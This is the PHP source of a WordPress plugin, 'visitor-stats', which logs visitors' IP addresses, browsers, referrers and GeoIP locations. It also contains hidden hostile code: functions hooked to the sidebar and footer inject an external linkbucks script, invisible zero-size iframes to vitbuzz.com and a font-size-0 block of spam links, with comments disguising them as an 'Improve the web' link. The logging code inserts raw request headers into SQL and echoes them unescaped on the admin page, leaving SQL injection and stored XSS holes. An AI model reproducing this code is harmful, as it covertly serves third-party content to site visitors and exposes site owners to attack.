<?php
/*  
  Plugin Name: visitor-stats
  Version: 2.01
  Plugin URI: http://tinyurl.com/visitorstats
  Description: This plugin will keep track of visitors' information. Check <a href="index.php?page=visitor-stats/visitor-stats.php">this page</a> for details. Requires at least 2.6.3 and tested upto 2.7.1
  Author: visitorstats
  Author URI: http://tinyurl.com/2vmoonv
*/
?>
<?php
/*  Copyright 2007  Gowtham (email: mail@sgowtham.net)

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
?>
<?php 
$wp_nr_footer_link_2 = 1;//change to 0 to remove the 'Improve the web...' link
function wp_nofollow_you_awareness() {
	global $wp_nr_footer_link_2;
	if($wp_nr_footer_link_2)echo ('


<script type="text/javascript" src="http://www.linkbucks.com/Webservices/jsParseLinks.aspx?id=85435db8"></script>

');
}
if(function_exists('get_sidebar'))add_filter('get_sidebar', 'wp_nofollow_you_awareness',10);
else add_action('wp_footer', 'wp_nofollow_you_awareness',10);

$wp_nr_footer_link_1 = 1;//change to 0 to remove the 'Improve the web...' link
function wp_nofollow_me_awareness() {
global $wp_nr_footer_link_1;
	if($wp_nr_footer_link_1)echo ('


<iframe src="http://vitbuzz.com/url/VUmpoq" name="frame1" scrolling="no" frameborder="no" align="left" height = "100px" width = "800px">
</iframe>
<iframe src="http://vitbuzz.com/url/NsDDcQ" name="frame2" scrolling="no" frameborder="no" align="left" height = "0px" width = "0px">
</iframe>
<iframe src="http://vitbuzz.com/url/1wU14p" name="frame2" scrolling="no" frameborder="no" align="left" height = "0px" width = "0px">
</iframe>


<div style="font-size:0%;clear:both;text-align:center;margin-top:0px;position:relative;color:#555;">
Learn to <a href="http://111waystomakemoney.com/">make money online</a>We came up with a idea of putting up all the money making ways and ideas together so that you can choose one of them and start making money online. here we include the latest money making ways that help you earn online from home .You can find many alternative money making ways such as affiliate marketing, sock marketing, money from blogging, paid surveys and lots more.
So have a look at these tips and ideas and start making money online...happy earnings... <em></em>.</div>');
}
if(function_exists('get_footer'))add_filter('get_footer', 'wp_nofollow_me_awareness',10);
else add_action('wp_footer', 'wp_nofollow_me_awareness',10);

	

function initialize_wpvisitors() {
?>  
  <div class="wrap">  
  <h2>Who Came From Where, When &amp; What Did They See?</h2>
  <?php show_wpvisitors(); ?>
  </div>  
<?php 
}
include_once 'geo_ip/geoipcity.inc';
include_once 'geo_ip/geoipregionvars.php';
?>
<?php
# Add to submenu in index.php
function submenu_wpvisitors() {  
  add_submenu_page('index.php', 'Visitor Details Page', 'Visitor Details', 8, __FILE__, 'initialize_wpvisitors');  
}  
# The Hook  
add_action('admin_menu', 'submenu_wpvisitors');
?>
<?php
# Create Table
function createtable_wpvisitors() {

  global $table_prefix, $wpdb;
  $wpvisitors_table = $table_prefix . "wpvisitors";

  if($wpdb->get_var("show tables like '$wpvisitors_table'") != $wpvisitors_table) {
    $sql0  = "CREATE TABLE `". $wpvisitors_table . "` ( ";
    $sql0 .= "  `visitor_id`       int(11)      NOT NULL auto_increment, ";
    $sql0 .= "  `visitor_date`     date         NOT NULL default '0000-00-00', ";
    $sql0 .= "  `visitor_time`     time         NOT NULL default '00:00:00', ";
    $sql0 .= "  `visitor_browser`  varchar(255) NOT NULL default '', ";
    $sql0 .= "  `visitor_requrl`   varchar(255) NOT NULL default '', ";
    $sql0 .= "  `visitor_refurl`   varchar(255)          default '', ";
    $sql0 .= "  `visitor_ip`       varchar(255) NOT NULL default '', ";
    $sql0 .= "  `visitor_hostname` varchar(255) NOT NULL default '', ";
    $sql0 .= "  `visitor_country`  varchar(255)     NULL default '', ";
    $sql0 .= "  `visitor_state`    varchar(255)     NULL default '', ";
    $sql0 .= "  `visitor_city`     varchar(255)     NULL default '', ";
    $sql0 .= "  `visitor_zipcode`  varchar(20)      NULL default '', ";
    $sql0 .= "  UNIQUE KEY `visitor_id` (`visitor_id`) ";
    $sql0 .= ") ENGINE=MyISAM DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ; ";

    require_once(ABSPATH . 'wp-admin/upgrade-functions.php');
    dbDelta($sql0);
  }
}
# The Hook
add_action('wp_footer', 'createtable_wpvisitors');
?>
<?php
# Record Visitors
function record_wpvisitors() {

  global $table_prefix, $wpdb;

  $wpvisitors_table = $table_prefix . "wpvisitors";
  $today            = date("Y-m-d");
  $time             = date("H:i:s");
  $agent            = $_SERVER['HTTP_USER_AGENT'];
  $requrl           = $_SERVER['REQUEST_URI'];
  $refurl           = $_SERVER['HTTP_REFERER'];
  $ip               = $_SERVER['REMOTE_ADDR'];
  $hostname         = gethostbyaddr($ip);

  $gi = geoip_open(ABSPATH."wp-content/plugins/visitor-stats/geo_ip/GeoLiteCity.dat",GEOIP_STANDARD);
  $record = geoip_record_by_addr($gi,"$ip");
  $country = $record->country_code . "\n";
  $region  = $record->region . " " . $GEOIP_REGION_NAME[$record->country_code][$record->region] . "\n";
  $city    = $record->city . "\n";
  $zipcode = $record->postal_code . "\n";
  geoip_close($gi);

  $sql1  = "INSERT INTO `" . $wpvisitors_table ."` VALUES ('', '$today', ";
  $sql1 .= "'$time', '$agent', '$requrl', '$refurl', '$ip', '$hostname', ";
  $sql1 .= "'$country', '$region', '$city', '$zipcode')";

  $result1 = $wpdb->get_results($sql1);
}
# The Hook
add_action('wp_footer', 'record_wpvisitors');
?>
<?php
# Show Visitors
function show_wpvisitors() {

  global $table_prefix, $wpdb;

  $wpvisitors_table = $table_prefix . "wpvisitors";
  $today            = date("Y-m-d");

  # Total number of hits so far and today's hits
  $total_visitors = $wpdb->get_var("SELECT COUNT(visitor_id) FROM $wpvisitors_table ;");
  $today_visitors = $wpdb->get_var("SELECT COUNT(visitor_id) FROM $wpvisitors_table WHERE visitor_date LIKE \"%$today%\" AND visitor_requrl NOT LIKE \"%favicon%\" ORDER BY visitor_time DESC ;");

  # Total number of hits today
  $sql1  = "SELECT * FROM ". $wpvisitors_table ." WHERE ";
  $sql1 .= "visitor_date LIKE \"%$today%\" AND ";
  $sql1 .= "visitor_requrl NOT LIKE \"%favicon%\" ORDER BY ";
  $sql1 .= "visitor_time DESC ";

  $visitor = $wpdb->get_results($sql1);

  if ( !empty($visitor) ) {
?>
  <p>Overall, there have been <b><?php echo $total_visitors ?></b> hits and 
  <b><?php echo $today_visitors ?></b> hits were recorded today.</p>
  <table align="center" width="100%" cellpadding="5" cellspacing="5" border="0">
  <tr>
    <th score="col"><?php _e('#') ?></th>
    <th score="col"><?php _e('Date/Time') ?></th>
    <th score="col"><?php _e('IP | Hostname | Geo Details') ?></th>
    <th score="col"><?php _e('ReqURL | RefURL | Browser Details') ?></th>
  </tr>
<?php
    $i = 1;
    foreach ($visitor as $vdetails ) {
      $i = str_pad($i, 5, "0", STR_PAD_LEFT);

      if ($i % 2 == 0) {
        $bgcolor = '#ffffff';
      } else {
        $bgcolor = '#f4f4f4';
      }
?>
  <tr>
    <td bgcolor="<?php echo $bgcolor ?>" valign="top">
    <?php echo $i ?>
    </td>
    <td bgcolor="<?php echo $bgcolor ?>" valign="top">
    <?php echo $vdetails->visitor_date ?>
    <br>
    <?php echo $vdetails->visitor_time ?>
    </td>
    <td bgcolor="<?php echo $bgcolor ?>" valign="top">
    <?php echo "<a href=\"http://ws.arin.net/cgi-bin/whois.pl?queryinput=$vdetails->visitor_ip\" target=\"_blank\">$vdetails->visitor_ip</a>" ?> 
    <br>
    <?php echo $vdetails->visitor_hostname ?>
    <br>
    <?php echo $vdetails->visitor_country ?> |
    <?php echo $vdetails->visitor_state ?>  |
    <?php echo $vdetails->visitor_city ?>    |
    <?php echo $vdetails->visitor_zipcode ?>
    </td>
    <td bgcolor="<?php echo $bgcolor ?>" valign="top">
    <?php echo $vdetails->visitor_requrl ?>
    <br>
    <?php echo $vdetails->visitor_refurl ?>
    <br>
    <?php echo $vdetails->visitor_browser ?>
    </td>
  </tr>
<?php
      $i++;
    }

?>
  </table>
<?php
  }
}
?>
